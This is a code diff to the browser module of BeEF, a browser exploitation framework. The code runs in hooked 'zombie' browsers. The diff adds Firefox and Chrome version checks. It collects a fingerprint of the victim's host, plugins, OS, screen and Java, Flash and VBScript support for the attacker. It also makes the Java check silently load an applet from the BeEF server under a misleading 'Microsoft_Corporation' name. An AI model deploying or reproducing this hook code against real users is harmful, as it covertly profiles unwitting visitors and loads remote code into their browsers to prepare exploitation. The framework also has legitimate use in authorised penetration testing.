@@ -48,9 +48,8 @@ beef.browser = {
 	 * Returns true if IE8.
 	 * @example: beef.browser.isIE8()
 	 */
-	isIE8: function() {						
-		$j("body").append('<!--[if IE 8]>     <div id="beefiecheck" class="ie ie8"></div>      <![endif]-->');
-		return ($j('#beefiecheck').hasClass('ie8'))?true:false;
+	isIE8: function() {
+		return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !window.performance;
 	},
 	
 	/**
@@ -58,8 +57,7 @@ beef.browser = {
 	 * @example: beef.browser.isIE9()
 	 */
 	isIE9: function() {
-		$j("body").append('<!--[if IE 9]>     <div id="beefiecheck" class="ie ie9"></div>      <![endif]-->');
-		return ($j('#beefiecheck').hasClass('ie9'))?true:false;
+		return !!window.XMLHttpRequest && !window.chrome && !window.opera && !!document.documentMode && !!window.XDomainRequest && !!window.performance;
 	},
 	
 	/**
@@ -159,11 +157,35 @@ beef.browser = {
 	},
 
 	/**
+	 * Returns true if FF11.
+	 * @example: beef.browser.isFF11()
+	 */
+	isFF11: function() {
+		return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/11\./) != null;
+	},
+
+	/**
+	 * Returns true if FF12
+	 * @example: beef.browser.isFF12()
+	 */
+	isFF12: function() {
+		return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/12\./) != null;
+	},
+
+	/**
+	 * Returns true if FF13
+	 * @example: beef.browser.isFF13()
+	 */
+	isFF13: function() {
+		return !!window.history.replaceState && window.navigator.userAgent.match(/Firefox\/13\./) != null;
+	},
+
+	/**
 	 * Returns true if FF.
 	 * @example: beef.browser.isFF()
 	 */
 	isFF: function() {
-		return this.isFF2() || this.isFF3() || this.isFF3_5() || this.isFF3_6() || this.isFF4() || this.isFF5() || this.isFF6() || this.isFF7() || this.isFF8() || this.isFF9() || this.isFF10();
+		return this.isFF2() || this.isFF3() || this.isFF3_5() || this.isFF3_6() || this.isFF4() || this.isFF5() || this.isFF6() || this.isFF7() || this.isFF8() || this.isFF9() || this.isFF10() || this.isFF11() || this.isFF12() || this.isFF13();
 	},
 
 	/**
@@ -295,11 +317,27 @@ beef.browser = {
     },
 
 	/**
+	 * Returns true if Chrome 18.
+	 * @example: beef.browser.isC18()
+	 */
+	isC18: function() {
+		return (!!window.chrome && !window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==18)?true:false);
+	},
+
+	/**
+	 * Returns true if Chrome 19.
+	 * @example: beef.browser.isC19()
+	 */
+	isC19: function() {
+		return (!!window.chrome && !window.webkitPerformance) && ((parseInt(window.navigator.appVersion.match(/Chrome\/(\d+)\./)[1], 10)==19)?true:false);
+	},
+
+	/**
 	 * Returns true if Chrome.
 	 * @example: beef.browser.isC()
 	 */
 	isC: function() {
-		return this.isC5() || this.isC6() || this.isC7() || this.isC8() || this.isC9() || this.isC10() || this.isC11() || this.isC12() || this.isC13() || this.isC14() || this.isC15() || this.isC16()|| this.isC17();
+		return this.isC5() || this.isC6() || this.isC7() || this.isC8() || this.isC9() || this.isC10() || this.isC11() || this.isC12() || this.isC13() || this.isC14() || this.isC15() || this.isC16()|| this.isC17() || this.isC18() || this.isC19();
 	},
 
 	/**
@@ -363,7 +401,9 @@ beef.browser = {
 			C14:	this.isC14(),	// Chrome 14
 			C15:    this.isC15(),   // Chrome 15
 			C16:	this.isC16(),	// Chrome 16
-            C17:	this.isC17(),	// Chrome 16
+            C17:	this.isC17(),	// Chrome 17
+			C18:	this.isC18(),	// Chrome 18
+			C19:	this.isC19(),	// Chrome 19
 			C:	this.isC(), 	// Chrome any version
 
 			FF2:	this.isFF2(),	// Firefox 2
@@ -377,6 +417,9 @@ beef.browser = {
 			FF8:	this.isFF8(),	// Firefox 8
 			FF9:	this.isFF9(),	// Firefox 9
 			FF10:	this.isFF10(),	// Firefox 10
+			FF11:	this.isFF11(),	// Firefox 11
+			FF12:	this.isFF12(),	// Firefox 12
+			FF13:	this.isFF13(),	// Firefox 13
 			FF:	this.isFF(),	// Firefox any version
 
 			IE6:	this.isIE6(),	// Internet Explorer 6
@@ -418,7 +461,8 @@ beef.browser = {
 		if (this.isC15())	{ return '15' }; 	// Chrome 15
 		if (this.isC16())	{ return '16' };	// Chrome 16
         if (this.isC17())	{ return '17' };	// Chrome 17
-
+		if (this.isC18())   { return '18' };    // Chrome 18
+		if (this.isC19())   { return '19' };    // Chrome 19
 
 		if (this.isFF2())	{ return '2'  };	// Firefox 2
 		if (this.isFF3())	{ return '3'  };	// Firefox 3
@@ -431,7 +475,9 @@ beef.browser = {
 		if (this.isFF8())	{ return '8'  };	// Firefox 8
 		if (this.isFF9())	{ return '9'  };	// Firefox 9
 		if (this.isFF10())	{ return '10' };	// Firefox 10
-
+		if (this.isFF11())	{ return '11' };	// Firefox 11
+		if (this.isFF12())	{ return '12' };	// Firefox 12
+		if (this.isFF13())	{ return '13' };	// Firefox 13
 
 		if (this.isIE6())	{ return '6'  };	// Internet Explorer 6
 		if (this.isIE7())	{ return '7'  };	// Internet Explorer 7
@@ -492,7 +538,19 @@ beef.browser = {
 			return flash_installed;
 		}
 	},
+
+	/**
+	* Checks if the zombie has Java enabled.
+ 	 * @return: {Boolean} true or false.
+     *
+     * @example: if(beef.browser.javaEnabled()) { ... }
+     */
+	javaEnabled: function() {
+
+		return (!!window.navigator.javaEnabled());
 	
+	},
+
 	/**
 	 * Checks if the zombie has Java installed and enabled.
 	 * @return: {Boolean} true or false.
@@ -500,8 +558,33 @@ beef.browser = {
 	 * @example: if(beef.browser.hasJava()) { ... }
 	 */
 	hasJava: function() {
-		if(!this.type().IE && window.navigator.javaEnabled && window.navigator.javaEnabled()) {
+
+		// Check if Java is enabled
+		if (!beef.browser.javaEnabled()) {
+			return false;
+		}
+
+        // This is a temporary fix as this does not work on Safari and Chrome
+		// Chrome requires manual user intervention even with unsigned applets.
+		// Safari requires a few seconds to load the applet.
+		if (beef.browser.isC() || beef.browser.isS()) {
 			return true;
+		}
+
+		// Inject an unsigned java applet to double check if the Java
+		// plugin is working fine.
+		try {
+			var applet_archive = 'http://'+beef.net.host+ ':' + beef.net.port + '/demos/checkJava.jar';
+   				var applet_id = 'checkJava';
+   				var applet_name = 'checkJava';
+   				var output;
+   				beef.dom.attachApplet(applet_id, 'Microsoft_Corporation', 'checkJava' ,
+  				null, applet_archive, null);
+   				output = document.Microsoft_Corporation.getInfo();
+			beef.dom.detachApplet('checkJava');
+			return output = 1;
+		} catch(e) {
+			return false;
 		}
 		return false;
 	},
@@ -524,29 +607,37 @@ beef.browser = {
 	 * Returns the list of plugins installed in the browser.
 	 */
 	getPlugins: function() {
-		var results = '';
-        if (this.isIE())
-        {
-            results = this.getPluginsIE();
-        } else {
-            if (navigator.plugins && navigator.plugins.length > 0)
-            {
-                var length = navigator.plugins.length;
-                for (var i=0; i < length; i++)
-                {
-                    if (i != 0)
-                        results += '\n';
-                    if(beef.browser.isFF()){ //FF returns exact plugin versions
-                        results += navigator.plugins[i].name + '-v.' + navigator.plugins[i].version;
-                    }else{ // Webkit and Presto (Opera) doesn't support the version attribute, and
-                           // sometimes they store plugin version in description (Real, Adobe)
-                        results += navigator.plugins[i].name;// + '-desc.' + navigator.plugins[i].description;
-                    }
-                }
-            } else {
-                results = 'navigator.plugins is not supported in this browser!';
-            }
-        }
+
+		var results;
+		Array.prototype.unique = function() {
+			var o = {}, i, l = this.length, r = [];
+			for(i=0; i<l;i+=1) o[this[i]] = this[i];
+			for(i in o) r.push(o[i]);
+			return r;
+		};
+
+		// Internet Explorer
+		if (this.isIE()) this.getPluginsIE();
+
+		// All other browsers that support navigator.plugins
+		else if (navigator.plugins && navigator.plugins.length > 0) {
+			results = new Array();
+			for (var i=0; i < navigator.plugins.length; i++) {
+
+				// Firefox returns exact plugin versions
+				if (beef.browser.isFF()) results[i] = navigator.plugins[i].name + '-v.' + navigator.plugins[i].version;
+
+				// Webkit and Presto (Opera)
+				// Don't support the version attribute
+				// Sometimes store the version in description (Real, Adobe)
+				else results[i] = navigator.plugins[i].name;// + '-desc.' + navigator.plugins[i].description;
+			}
+			results = results.unique().toString();
+
+		// All browsers that don't support navigator.plugins
+		} else results = 'navigator.plugins is not supported in this browser!';
+
+		// Return results
 		return results;
 	},
 	
@@ -623,7 +714,7 @@ beef.browser = {
 	/**
 	 * Returns zombie screen size and color depth.
 	 */	
-	getScreenParams: function() {
+	getScreenSize: function() {
 		return {
 			width: window.screen.width, 
 			height: window.screen.height,
@@ -672,14 +763,13 @@ beef.browser = {
 		var hostname = document.location.hostname;
 		var hostport = (document.location.port)? document.location.port : "80";
 		var browser_plugins = beef.browser.getPlugins();
+		var date_stamp = new Date().toString();
 		var os_name = beef.os.getName();
 		var system_platform = (typeof(navigator.platform) != "undefined" && navigator.platform != "") ? navigator.platform : null;
-		var internal_ip = beef.net.local.getLocalAddress();
-		var internal_hostname = beef.net.local.getLocalHostname();
 		var browser_type = JSON.stringify(beef.browser.type(), function (key, value) {if (value == true) return value; else if (typeof value == 'object') return value; else return;});
-		var screen_params = beef.browser.getScreenParams();
+		var screen_size = beef.browser.getScreenSize();
 		var window_size = beef.browser.getWindowSize();
-		var java_enabled = (beef.browser.hasJava())? "Yes" : "No";
+		var java_enabled = (beef.browser.javaEnabled())? "Yes" : "No";
 		var vbscript_enabled=(beef.browser.hasVBScript())? "Yes" : "No";
 		var has_flash = (beef.browser.hasFlash())? "Yes" : "No";
 		var has_googlegears=(beef.browser.hasGoogleGears())? "Yes":"No";
@@ -699,13 +789,12 @@ beef.browser = {
 		if(hostport) details["HostPort"] = hostport;
 		if(browser_plugins) details["BrowserPlugins"] = browser_plugins;
 		if(os_name) details['OsName'] = os_name;
+		if(date_stamp) details['DateStamp'] = date_stamp;
 		if(system_platform) details['SystemPlatform'] = system_platform;
-		if(internal_ip) details['InternalIP'] = internal_ip;
-		if(internal_hostname) details['InternalHostname'] = internal_hostname;
 		if(browser_type) details['BrowserType'] = browser_type;
-		if(screen_params) details['ScreenParams'] = screen_params;
+		if(screen_size) details['ScreenSize'] = screen_size;
 		if(window_size) details['WindowSize'] = window_size;
-		if(java_enabled) details['JavaEnabled'] = java_enabled
+		if(java_enabled) details['JavaEnabled'] = java_enabled;
 		if(vbscript_enabled) details['VBScriptEnabled'] = vbscript_enabled
 		if(has_flash) details['HasFlash'] = has_flash
 		if(has_web_socket) details['HasWebSocket'] = has_web_socket
